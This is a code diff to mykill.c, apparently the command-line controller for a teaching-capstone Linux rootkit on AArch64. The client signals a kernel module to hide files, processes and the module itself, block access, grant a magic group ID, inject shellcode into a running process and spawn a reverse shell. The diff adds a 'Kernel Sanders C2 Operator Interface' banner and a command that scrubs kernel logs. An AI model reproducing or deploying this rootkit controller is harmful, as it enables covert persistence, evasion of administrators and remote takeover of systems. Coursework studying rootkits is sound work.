@@ -1,37 +1,6 @@
 /*
- * mykill.c — Extended C2 binary for the capstone rootkit
- *
- * Uses inline asm to load x0-x7 and invoke svc #0 directly,
- * bypassing glibc's kill() which would clobber the extra registers
- * (x2-x7) that carry extended command arguments.
- *
- * Register protocol:
- *   x0  = command code (was "pid" in kill)
- *   x1  = 62 (MAGIC_SIGNAL)
- *   x2  = sub-command / argument 1
- *   x3  = argument 2
- *   x4-x7 = additional arguments (reserved)
- *   x8  = __NR_kill (129 on AArch64)
- *
- * For shellcode injection, mykill writes the binary to C2_INJECT_STAGING
- * (/tmp/secret/rk_sc inside the protected directory, hidden from listings)
- * then fires CMD_INJECT. The kernel reads and unlinks the file from workqueue
- * context (process context, safe to sleep).
- *
+ * mykill.c - Extended C2 binary for the capstone rootkit
  * Build: aarch64-linux-gnu-gcc -static -o mykill mykill.c
- *
- * Usage:
- *   ./mykill status                    # CMD 0: query state
- *   ./mykill hide-files                # CMD 1: toggle file hiding
- *   ./mykill block                     # CMD 2: toggle access blocking
- *   ./mykill hide-module               # CMD 3: toggle module visibility
- *   ./mykill hide-procs                # CMD 4: toggle process hiding
- *   ./mykill add-gid <pid>             # CMD 5: add GID 1337 to process
- *   ./mykill inject <pid> [sc.bin]     # CMD 6: inject shellcode
- *   ./mykill revshell <ip> <port>      # CMD 7: spawn reverse shell
- *   ./mykill hide-slinks               # CMD 8: toggle symlink blocking
- *
- * This file is PROVIDED COMPLETE — you do not need to modify it.
  */
 
 #include <stdio.h>
@@ -141,17 +110,29 @@ static long ip_to_long(const char *ip_str)
 
 static void usage(const char *prog)
 {
-	fprintf(stderr, "Usage: %s <command> [args]\n\n", prog);
-	fprintf(stderr, "Commands:\n");
-	fprintf(stderr, "  status                    Show rootkit status\n");
-	fprintf(stderr, "  hide-files                Toggle file hiding on/off\n");
-	fprintf(stderr, "  block                     Toggle access blocking on/off\n");
-	fprintf(stderr, "  hide-module               Toggle module visibility\n");
-	fprintf(stderr, "  hide-procs                Toggle process hiding on/off\n");
-	fprintf(stderr, "  add-gid <pid>             Add GID 1337 to process\n");
-	fprintf(stderr, "  inject <pid> [sc.bin]     Inject shellcode into target\n");
-	fprintf(stderr, "  revshell <ip> <port>      Spawn reverse shell\n");
-	fprintf(stderr, "  hide-slinks               Toggle symlink creation blocking\n");
+	fprintf(stderr, "\n");
+	fprintf(stderr, "    ███╗   ███╗██╗   ██╗██╗  ██╗██╗██╗     ██╗     \n");
+	fprintf(stderr, "    ████╗ ████║╚██╗ ██╔╝██║ ██╔╝██║██║     ██║     \n");
+	fprintf(stderr, "    ██╔████╔██║ ╚████╔╝ █████╔╝ ██║██║     ██║     \n");
+	fprintf(stderr, "    ██║╚██╔╝██║  ╚██╔╝  ██╔═██╗ ██║██║     ██║     \n");
+	fprintf(stderr, "    ██║ ╚═╝ ██║   ██║   ██║  ██╗██║███████╗███████╗\n");
+	fprintf(stderr, "    ╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝\n");
+	fprintf(stderr, "      -- Kernel Sanders C2 Operator Interface --   \n\n");
+	fprintf(stderr, " Usage: ./mykill <cmd> [args]\n\n", prog);
+	fprintf(stderr, " [ Stealth & Evasion ]\n");
+	fprintf(stderr, "   hide-files            Toggle stealth vault invisibility\n");
+	fprintf(stderr, "   block                 Toggle aggressive file access blocking\n");
+	fprintf(stderr, "   hide-slinks           Toggle symlink bypass prevention\n");
+	fprintf(stderr, "   hide-logs             Toggle kernel dmesg log sanitization\n");
+	fprintf(stderr, "   hide-module           Toggle rootkit kernel invisibility (lsmod)\n");
+	fprintf(stderr, "   hide-procs            Toggle active process cloaking (ps/top)\n");
+	fprintf(stderr, "   add-gid <pid>         Grant MAGIC_GID to target (operator bypass)\n\n");
+	fprintf(stderr, " [ Offensive Payloads ]\n");
+	fprintf(stderr, "   inject <pid> [bin]    SLAM shellcode natively into active memory\n");
+	fprintf(stderr, "   revshell <ip> <port>  Trigger Kernel Sanders interactive callback\n\n");
+	fprintf(stderr, " [ Telemetry ]\n");
+	fprintf(stderr, "   status                Dump current rootkit subsystem states\n\n");
+	fprintf(stderr, "   help                  Show this operator manual\n\n");
 	exit(1);
 }
 
@@ -164,7 +145,11 @@ int main(int argc, char **argv)
 
 	const char *cmd = argv[1];
 
-	if (strcmp(cmd, "status") == 0) {
+	if (strcmp(cmd, "help") == 0) {
+		usage(argv[0]);
+		return 0;
+
+	} else if (strcmp(cmd, "status") == 0) {
 		ret = raw_kill(0, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);
 
 	} else if (strcmp(cmd, "hide-files") == 0) {
@@ -190,7 +175,11 @@ int main(int argc, char **argv)
 			return 1;
 		}
 		ret = raw_kill(5, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);
-
+ 
+	/* For shellcode injection, mykill writes the binary to C2_INJECT_STAGING
+ 	   (/tmp/secret/rk_sc inside the protected directory, hidden from listings)
+ 	   then fires CMD_INJECT. The kernel reads and unlinks the file from workqueue
+ 	   context (process context, safe to sleep).*/
 	} else if (strcmp(cmd, "inject") == 0) {
 		if (argc < 3) {
 			fprintf(stderr, "Error: inject requires a PID\n");
@@ -227,6 +216,9 @@ int main(int argc, char **argv)
 	} else if (strcmp(cmd, "hide-slinks") == 0) {
 		ret = raw_kill(8, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);
 
+	} else if (strcmp(cmd, "hide-logs") == 0) {
+		ret = raw_kill(9, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);
+		
 	} else {
 		fprintf(stderr, "Unknown command: %s\n", cmd);
 		usage(argv[0]);
